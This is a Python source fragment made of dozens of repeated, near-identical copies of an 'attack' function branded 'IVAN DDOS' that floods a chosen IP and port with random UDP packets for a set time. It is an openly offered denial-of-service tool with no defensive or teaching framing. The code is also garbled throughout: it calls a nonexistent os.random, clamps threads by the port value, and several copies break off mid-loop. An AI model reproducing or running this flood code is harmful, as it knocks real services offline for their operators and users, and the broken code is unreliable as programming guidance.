        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
